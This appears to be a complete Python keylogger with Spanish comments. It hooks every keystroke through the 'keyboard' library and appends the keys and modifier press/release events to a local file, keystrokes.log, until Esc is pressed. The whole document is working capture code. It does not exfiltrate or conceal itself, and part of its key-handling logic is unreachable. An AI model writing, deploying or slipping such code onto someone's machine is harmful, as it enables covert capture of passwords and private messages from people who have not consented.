from functools import partial
import atexit
import os

import keyboard

MAP = {
  "space": " ",
  "\r": "\n"
}

FILE_NAME = "keystrokes.log"
CLEAR_ON_STARTUP = False
TERMINATE_KEY = "esc"

def callback (output, is_down, event):
  if event.event_type in ("up", "down"):
    key = MAP.get(event.name, event.name)
    modifier = len(key) > 1
    # Capturar unicamente los modificadores cuando estan saliendo presionados
    if not modifier and event.event_type == "down":
      return
    # Evitar escribir multiples veces la misma tecla si esta siendo presionada
    if modifier:
      if event.event_type == "down":
        if is_down.get(key, False):
          return
        else:
          is_down[key] = True
      elif event.event_type == "up":
        is_down[key] = False
      # Indicar si esta siendo presionada
      key = " [{} ({})] ".format(key, event.event_type)
    elif key == "\r":
      # Salto de linea
      key = "\n"
    # Escribir la tecla en el archivo de salida
    output.write(key)
    # Forzar escritura
    output.flush()

def onexit(output):
  output.close()

def main():
  # Borrar el archivo previo
  if CLEAR_ON_STARTUP:
    os.remove(FILE_NAME)
  # Indica si una tecla esta siendo presionada
  is_down = {}
  # Archivo de salida
  output = open(FILE_NAME, "a")
  # Cerrar el archivo al terminar el programa
  atexit.register(onexit, output)
  # Instalar el registrador de teclas
  keyboard.hook(partial(callback, output, is_down))
  keyboard.wait(TERMINATE_KEY)

if __name__ == "__main__":
  main()
